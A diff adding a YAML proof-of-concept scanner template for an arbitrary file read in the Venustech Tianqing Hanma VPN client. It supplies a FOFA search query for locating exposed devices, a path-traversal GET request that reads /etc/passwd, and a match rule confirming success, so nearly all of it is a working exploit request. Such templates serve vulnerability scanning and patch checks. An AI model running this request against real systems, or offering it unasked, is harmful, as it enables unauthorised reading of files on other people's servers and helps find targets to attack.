@@ -1,0 +1,14 @@
+id: poc-yaml-venustech-vpn-client-read-any-file
+info:
+  name: 启明星辰天清汉马VPN client任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 天清汉马VPN
+  fofa: body="select_auth_method" || body="select_auth_input"
+requests:
+- method: GET
+  path: /vpn/user/download/client?ostype=../../../../../../../etc/passwd
+  expression: "status_code == 200 && \nmatches(body, \"root:[x*]:0:0:\")\n"
+variables: {}
+transport: http
